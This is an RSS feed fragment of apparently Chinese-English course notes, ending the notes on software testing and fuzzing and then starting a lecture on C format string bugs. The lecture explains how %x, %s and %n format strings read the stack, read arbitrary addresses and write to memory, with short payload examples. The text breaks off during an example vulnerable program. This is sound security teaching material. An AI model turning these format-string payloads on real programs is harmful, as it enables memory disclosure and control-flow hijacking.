Software testing determines the correctness of software under the assumption of some specific hypotheses. Compares the state and behaviour of the product against test oracles.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/27/671dfbadce67b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Types of Software Testing
&lt;ol&gt;
&lt;li&gt;Manual testing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Without using any automated tool or any script&lt;/li&gt;
&lt;li&gt;E.g. unit testing, integration testing, system testing, user experience testing&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Automated testing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Use scripts or another software to test the product&lt;/li&gt;
&lt;li&gt;E.g. regression testing, performance testing, stress testing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Testing levels
&lt;ol&gt;
&lt;li&gt;Unit testing: Test an individual component or group of inter-related components&lt;/li&gt;
&lt;li&gt;Integration testing: Individual components are combined and tested as a group&lt;/li&gt;
&lt;li&gt;System testing: Test a complete and integrated system&lt;/li&gt;
&lt;li&gt;Acceptance testing: Evaluate a system for compliance with the business requirements&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Testing techniques and tactics
&lt;ol&gt;
&lt;li&gt;Regression testing: Make sure that whole system works properly after adding new components&lt;/li&gt;
&lt;li&gt;Stress testing: Test the software under extreme conditions&lt;/li&gt;
&lt;li&gt;Performance testing: Test the speed and effectiveness of the software&lt;/li&gt;
&lt;li&gt;Security testing: Test the program for security vulnerabilities&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Methods&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Methods&#34;&gt;#&lt;/a&gt;Methods&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Black-box testing: No access to the source code of the software. Only monitor the output of a system after providing a specific input
&lt;ol&gt;
&lt;li&gt;Treat the software as a black box&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Examining functionality without any knowledge of internal implementation&lt;/li&gt;
&lt;li&gt;Not biased toward an implementation&lt;/li&gt;
&lt;li&gt;But may leaves parts of the program untested&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Examples:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Boundary value and all-pairs testing&lt;/li&gt;
&lt;li&gt;Model-based and specification-based testing&lt;/li&gt;
&lt;li&gt;Use case testing&lt;/li&gt;
&lt;li&gt;Fuzz testing&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;White-box testing: Access to the source code of the software
&lt;ol&gt;
&lt;li&gt;Verify the internal structures or workings of a program&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Exercise paths through the code and determine the appropriate outputs&lt;/li&gt;
&lt;li&gt;Bring more complexity to testing&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Code coverage criteria:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Control flow testing&lt;/li&gt;
&lt;li&gt;Data flow testing&lt;/li&gt;
&lt;li&gt;Branch testing and decision coverage&lt;/li&gt;
&lt;li&gt;Statement coverage&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Code Coverage: Code that has not been covered by tests is likely to contain bugs&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Coverage = (# of elements tested) ÷ (# of elements in the program)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Grey-box testing: A mix of white-box and black-box tests&lt;br&gt;
Grey-box testers partially know the internal structure, such as documentation of internal data structures as well as the algorithms used&lt;br&gt;
They make better-informed testing choices while testing the software from outside&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Can take the straightforward technique of black-box testing&lt;/li&gt;
&lt;li&gt;Still benefited from the code-targeted systems in white-box testing&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Principles of Software Testing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Testing shows the presence of defects, not their absence: Testing reduces the number of defects but not a proof of correctness&lt;/li&gt;
&lt;li&gt;Exhaustive testing is impossible: For every combinations of inputs and preconditions in a nontrivial program&lt;/li&gt;
&lt;li&gt;Early testing saves time and money: Testing should start as early as possible in software development life cycle&lt;/li&gt;
&lt;li&gt;Defects cluster together: Pareto Principle in software testing: 80% of issues comes from 20% of modules&lt;/li&gt;
&lt;li&gt;Beware of the pesticide paradox: Repeating old test cases will eventually fail to find new defects&lt;/li&gt;
&lt;li&gt;Testing is context dependent: Different kinds of software are tested differently&lt;/li&gt;
&lt;li&gt;Absence-of-errors is a fallacy: Unusable software without bugs is still unusable&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Fuzz testing&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Fuzz testing&#34;&gt;#&lt;/a&gt;Fuzz testing&lt;/h1&gt;
&lt;h2 id=&#34;Definition&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Definition&#34;&gt;#&lt;/a&gt;Definition&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;What Is Fuzzing&lt;br&gt;
A negative testing method that provides random or abnormal input data (fuzz) to a program&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Produce almost no false positive (误报)&lt;br&gt;
Monitor bad behaviour in the responses&lt;/li&gt;
&lt;li&gt;For example, by crashing, or by failing built-in code assertions&lt;/li&gt;
&lt;li&gt;If the program fails, the defects can be noted&lt;/li&gt;
&lt;li&gt;If no crash is produced, inputs are mutated to produce further inputs&lt;br&gt;
Software tools that work with fuzzing are called fuzzers&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Anatomy of a Fuzzer&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Fuzz targets: Small programs that test predefined API functions, similar to unit tests&lt;/li&gt;
&lt;li&gt;Fuzz generators: Create random mutations of inputs to the software under test&lt;/li&gt;
&lt;li&gt;Delivery mechanism: Process inputs from fuzz generators and feed them to the software for execution&lt;/li&gt;
&lt;li&gt;Monitoring system: Keep track of how the inputs are executed and detect triggered bugs from the&lt;br&gt;
software&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/27/671e081d4f722.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Reasons for its Success
&lt;ol&gt;
&lt;li&gt;Random input&lt;br&gt;
No model of program behaviour, application type, or system description
&lt;ul&gt;
&lt;li&gt;Random ASCII characters used to test command-line utility options&lt;/li&gt;
&lt;li&gt;Studied Unix, Linux, Windows NT and Mac OS X&lt;br&gt;
Able to test hundreds of applications, each with a multitude of inputs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Simple criteria&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Pass or fail verdict for fuzzing was very simple: If the application crashes or hangs, it is considered to fail the test. Otherwise, it passes (i.e. quietly exit)&lt;/li&gt;
&lt;li&gt;Very little monitoring was used&lt;br&gt;
Any means of trying to hide the failures would have left the problems undiscovered&lt;br&gt;
No memory leak or heap overflow was caught, unless they resulted in a crash&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Automated testing&lt;br&gt;
The fuzz testing was entirely automated&lt;br&gt;
Results were compared across applications, operating systems, and vendors&lt;br&gt;
Key differences to traditional testing practices
&lt;ul&gt;
&lt;li&gt;General purpose tool&lt;/li&gt;
&lt;li&gt;Extremely easy to use&lt;/li&gt;
&lt;li&gt;Find security problems&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Types of Fuzzers&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Types of Fuzzers&#34;&gt;#&lt;/a&gt;Types of Fuzzers&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Dumb fuzzing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Produce input completely randomly&lt;/li&gt;
&lt;li&gt;Easy and inexpensive to set up&lt;/li&gt;
&lt;li&gt;Not efficient&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Smart fuzzing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Produce inputs that are based on valid input formats&lt;/li&gt;
&lt;li&gt;Require detailed knowledge about input format&lt;/li&gt;
&lt;li&gt;Take longer to set up&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Black-box fuzzin&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Feed a program random inputs to see whether it crashes&lt;/li&gt;
&lt;li&gt;Advantage: easy to configure&lt;/li&gt;
&lt;li&gt;Disadvantage: inefficient search
&lt;ul&gt;
&lt;li&gt;Input often requires structures, random inputs are likely to be malformed&lt;/li&gt;
&lt;li&gt;Hard to generate inputs for certain paths&lt;/li&gt;
&lt;li&gt;May re-run the same path over and over again&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;White-box fuzzing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Look inside the box: Use source code to guide fuzzing&lt;/li&gt;
&lt;li&gt;Can understand and assert security properties: Explore different program execution paths to check for security properties&lt;/li&gt;
&lt;li&gt;Significantly more complex
&lt;ul&gt;
&lt;li&gt;Need to check whether an input can violate a security property&lt;/li&gt;
&lt;li&gt;Find inputs that will go down different program execution paths&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Mutation-based fuzzing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;User supplies a well-formed input&lt;/li&gt;
&lt;li&gt;Fuzzer generates random changes to that input&lt;/li&gt;
&lt;li&gt;No assumption about input
&lt;ul&gt;
&lt;li&gt;Only assume that variants of well-formed input may be problematic&lt;/li&gt;
&lt;li&gt;Not dependent on program details&lt;/li&gt;
&lt;li&gt;May be strongly biased by the initial input!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example: zzuf&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;Generation-based fuzzing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Generate inputs from some description of the format
&lt;ul&gt;
&lt;li&gt;Using specified protocols or file format info (RFC, documentation, etc.)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Require the user to specify a format or protocol. Or, write a generator for generating well-formatted inputs&lt;/li&gt;
&lt;li&gt;Advantage: more complete search with inputs more specific to the program operations&lt;/li&gt;
&lt;li&gt;Disadvantage: more cumbersome
&lt;ul&gt;
&lt;li&gt;Need specification or generator for every input format and program!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example: Peach, SPIKE&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;Coverage-based fuzzing&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Instrument the program to track coverage&lt;/li&gt;
&lt;li&gt;Maintain a pool of high-quality tests
&lt;ul&gt;
&lt;li&gt;Start with some initial ones specified by users&lt;/li&gt;
&lt;li&gt;Mutate tests in the pool to generate new tests&lt;/li&gt;
&lt;li&gt;Run new tests&lt;/li&gt;
&lt;li&gt;If a new test leads to new elements, save the new test to the pool&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example: AFL&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Challenges&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Challenges&#34;&gt;#&lt;/a&gt;Challenges&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;What Fuzzing is NOT Good for&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Bugs that can be found by fuzzing
&lt;ul&gt;
&lt;li&gt;Memory corruption errors, incorrect null handling, bad exception handling&lt;/li&gt;
&lt;li&gt;Deadlocks, infinite loops, assertion violations&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Possible target programs:
&lt;ul&gt;
&lt;li&gt;Desktop applications (browsers, PDF readers, graphics, office suites)&lt;/li&gt;
&lt;li&gt;Libraries (images, audio, crypto APIs) and tools (perl, clang, gcc, sqlite)&lt;/li&gt;
&lt;li&gt;Systems (OS kernels, drivers)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;NOT Good for&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Unit tests that verify that the software works as expected&lt;/li&gt;
&lt;li&gt;Finding logical security flaws
&lt;ul&gt;
&lt;li&gt;E.g. privilege escalation, access control, authorisation, information leakage&lt;/li&gt;
&lt;li&gt;Fuzzing won’t tell you unless you have some tests that checks for this situation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Testing for known bugs&lt;/li&gt;
&lt;li&gt;Memory safe code&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Challenges of Guided Fuzzing&lt;br&gt;
Like any testing, fuzzing is unlikely to reach all code paths in the target program&lt;br&gt;
Attempts to solve this problem
&lt;ul&gt;
&lt;li&gt;Corpus distillation: Select a subset of interesting seeds with simple block coverage&lt;/li&gt;
&lt;li&gt;Static analysis: Over-approximate program behaviours without running the program&lt;/li&gt;
&lt;li&gt;Symbolic or concolic execution: Symbolically execute a program to explore all feasible program paths&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/Format-string-bugs/</guid>
            <title>Format string bugs</title>
            <link>http://example.com/course/Format-string-bugs/</link>
            <category>C</category>
            <category>software security</category>
            <category>vulnerability</category>
            <pubDate>Sat, 26 Oct 2024 21:52:22 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Format Functions&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Format Functions&#34;&gt;#&lt;/a&gt;Format Functions&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Format Functions&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;printf&lt;/code&gt;  Output a formatted string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fprintf&lt;/code&gt;  Writes the printf to a file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sprintf&lt;/code&gt;  Prints into a string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;snprintf&lt;/code&gt;  Prints into a string checking the length&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vprintf&lt;/code&gt;  Prints the argument list to stdout&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vfprintf&lt;/code&gt;  Prints the argument list to a file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vsprintf&lt;/code&gt;  Prints the argument list to a string&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vsnprintf&lt;/code&gt;  Prints the argument to a string checking the length&lt;br&gt;
 总结： &lt;code&gt;printf&lt;/code&gt;  和  &lt;code&gt;fprintf&lt;/code&gt;  用于输出格式化字符串到标准输出或文件。&lt;br&gt;
 &lt;code&gt;sprintf&lt;/code&gt;  和  &lt;code&gt;snprintf&lt;/code&gt;  用于将格式化字符串写入字符串缓冲区， &lt;code&gt;snprintf&lt;/code&gt;  更安全。&lt;br&gt;
 &lt;code&gt;vprintf&lt;/code&gt; 、 &lt;code&gt;vfprintf&lt;/code&gt; 、 &lt;code&gt;vsprintf&lt;/code&gt;  和  &lt;code&gt;vsnprintf&lt;/code&gt;  用于处理可变参数列表，与前面的函数类似，但专门用于  &lt;code&gt;va_list&lt;/code&gt;  参数的处理。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Format Strings&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Format String is the argument of format functions that contains format parameters. Format parameters are placeholders to be replaced with user inputs&lt;/li&gt;
&lt;li&gt;For example, the statement will output different sentences, depending on what is contained in the variable name:  &lt;code&gt;printf(&amp;quot;Hello, %s.&amp;quot;, &amp;amp;name);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;If the variable name contains the string “Zz”, then  &lt;code&gt;printf()&lt;/code&gt;  will output: Hello, Zz.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Common Parameters Used in Format String Attacks&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;th&gt;传递方式&lt;/th&gt;
&lt;th&gt;在攻击中的作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;%s&lt;/td&gt;
&lt;td&gt;打印字符串&lt;/td&gt;
&lt;td&gt;引用（指向字符串的指针）&lt;/td&gt;
&lt;td&gt;攻击者可以利用 % s 打印出内存中的任意数据，通过提供特定的内存地址，读取敏感数据（如密码、密钥等）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%d&lt;/td&gt;
&lt;td&gt;打印有符号十进制整数&lt;/td&gt;
&lt;td&gt;整数值&lt;/td&gt;
&lt;td&gt;虽然 % d 通常用于整数显示，但攻击者可以通过它来泄露内存中的整数值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%u&lt;/td&gt;
&lt;td&gt;打印无符号十进制整数&lt;/td&gt;
&lt;td&gt;无符号整数值&lt;/td&gt;
&lt;td&gt;与 % d 类似，但用于无符号整数的显示。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%x&lt;/td&gt;
&lt;td&gt;打印十六进制整数（小写）&lt;/td&gt;
&lt;td&gt;无符号整数值&lt;/td&gt;
&lt;td&gt;攻击者可以通过 % x 逐步读取内存，以十六进制显示地址中的数据内容。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%c&lt;/td&gt;
&lt;td&gt;打印单个字符&lt;/td&gt;
&lt;td&gt;字符值&lt;/td&gt;
&lt;td&gt;用于显示单个字符，但在攻击中用途有限。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%n&lt;/td&gt;
&lt;td&gt;将已打印的字符数写入指定变量&lt;/td&gt;
&lt;td&gt;引用（指向整数的指针）&lt;/td&gt;
&lt;td&gt;攻击者可以利用 % n 修改任意内存地址的值，这是格式字符串攻击中最危险的参数之一，可能被用来修改程序的控制流。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%%&lt;/td&gt;
&lt;td&gt;打印 % 字符&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;用于输出 % 字符，无特别的攻击价值。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;How Do Format Functions Work?&lt;br&gt;
According to the data format dictated by the format parameters, format functions retrieve the arguments from the stack&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;printf(“A is the number %d, B is the string %s”, A, &amp;amp;B);&lt;br&gt;
The  &lt;code&gt;printf()&lt;/code&gt;  function will attempt to retrieve the value of A and the address of string B from the stack&lt;br&gt;
 在格式化字符串中，每个格式参数（如  &lt;code&gt;%d&lt;/code&gt; 、 &lt;code&gt;%s&lt;/code&gt; ）都告诉  &lt;code&gt;printf()&lt;/code&gt;  如何解释栈中的数据： &lt;code&gt;%d&lt;/code&gt;  表示检索一个 整数值。 &lt;code&gt;%s&lt;/code&gt;  表示检索一个 字符串指针（地址），然后根据地址打印对应的字符串。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Exploit&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Exploit&#34;&gt;#&lt;/a&gt;Exploit&lt;/h1&gt;
The vulnerability occurs when there is a mismatch between the number of format parameters and the number of function arguments provided to fill those places 
- For example, if an attacker is able to supply more placeholders than there are arguments, he/she can use format functions to read or write the stack! 
Format functions can be exploited when an attacker is given direct control over the format string fed into the function
&lt;ol&gt;
&lt;li&gt;Reading Data from Stack&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;printf(&amp;quot;A is the number  &lt;code&gt;%d&lt;/code&gt; , reading stack data:  &lt;code&gt;%x&lt;/code&gt; &amp;quot;, A);
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;printf()&lt;/code&gt;  will attempt to retrieve two values from the stack&lt;/li&gt;
&lt;li&gt;But only one of those is placed on the stack&lt;/li&gt;
&lt;li&gt;&lt;code&gt;printf()&lt;/code&gt;  will retrieve the next value on the stack and display it in hex format!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To print the next 20 items on the stack:
&lt;ul&gt;
&lt;li&gt;printf(&amp;quot;%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x&amp;quot;);&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To print the tenth element next on the stack:
&lt;ul&gt;
&lt;li&gt;printf(&amp;quot;%10$x&amp;quot;);&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Reading Data at Arbitrary Location  &lt;code&gt;%s&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Format functions treat the data on the stack as an address to go fetch a string
&lt;ul&gt;
&lt;li&gt;Note that  &lt;code&gt;%s&lt;/code&gt;  is passed as reference!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to control the address accessed by  &lt;code&gt;%s&lt;/code&gt; ?
&lt;ul&gt;
&lt;li&gt;Place an address on the format string (the string is stored on stack)&lt;/li&gt;
&lt;li&gt;Get  &lt;code&gt;%s&lt;/code&gt;  to dereference it!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To print the string located at address 0x12345678:
&lt;ul&gt;
&lt;li&gt;printf(&amp;quot;\x78\x56\x34\x12%x%x%x%s&amp;quot;, A, B, C);&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Writing Data at Arbitrary Location  &lt;code&gt;%n&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%n&lt;/code&gt;  stores the number of characters written so far into the corresponding function argument! For example, the following code put the integer 5 into the variable  &lt;code&gt;num_char&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; num_char; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;11111%n&amp;quot;&lt;/span&gt;, &amp;amp;num_char); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;With width-controlling format parameters, the attacker can write arbitrary integers to the location pointed to by the function argument&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Write 10 to num_char using width-controlling format parameter&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; num_char; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%10d%n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;num_char);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Control the amount of data written with length parameter
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;printf(&amp;quot;%10d%hn&amp;quot;, 0, &amp;amp;num_char);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Writes 2 bytes (instead of 4 bytes) to  &lt;code&gt;&amp;amp;num_char&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Combined with the trick to access arbitrary memory locations, the attacker can write to arbitrary memory locations&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Example&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;512&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     fgets(buf, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(buf), &lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// 安全读取输入，不会导致缓冲区溢出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;The input is:&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span 